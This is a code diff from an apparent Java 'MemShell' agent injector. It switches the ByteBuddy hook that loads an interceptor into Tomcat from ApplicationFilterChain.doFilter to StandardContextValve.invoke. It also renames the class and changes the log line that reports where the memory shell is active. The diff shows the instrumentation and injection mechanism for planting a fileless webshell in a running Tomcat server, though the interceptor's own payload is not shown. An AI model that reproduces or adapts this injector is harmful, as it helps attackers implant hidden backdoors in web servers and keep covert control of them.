@@ -16,7 +16,7 @@ import static net.bytebuddy.matcher.ElementMatchers.named;
  * @author ReaJason
  * @since 2024/12/28
  */
-public class TomcatFilterChainAgentInjector implements AgentBuilder.Transformer {
+public class TomcatContextValveAgentInjector implements AgentBuilder.Transformer {
 
     static Class<?> interceptorClass = null;
 
@@ -33,7 +33,7 @@ public class TomcatFilterChainAgentInjector implements AgentBuilder.Transformer 
                                             TypeDescription typeDescription,
                                             ClassLoader classLoader, JavaModule module,
                                             ProtectionDomain protectionDomain) {
-        return builder.visit(Advice.to(interceptorClass).on(named("doFilter")));
+        return builder.visit(Advice.to(interceptorClass).on(named("invoke").and(ElementMatchers.returns(void.class))));
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
@@ -56,9 +56,9 @@ public class TomcatFilterChainAgentInjector implements AgentBuilder.Transformer 
                 .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
 //                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
 //                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
-                .type(named("org.apache.catalina.core.ApplicationFilterChain"))
-                .transform(new TomcatFilterChainAgentInjector())
+                .type(named("org.apache.catalina.core.StandardContextValve"))
+                .transform(new TomcatContextValveAgentInjector())
                 .installOn(inst);
-        System.out.println("MemShell Agent is working at org.apache.catalina.core.ApplicationFilterChain.doFilter");
+        System.out.println("MemShell Agent is working at org.apache.catalina.core.StandardContextValve.invoke");
     }
 }
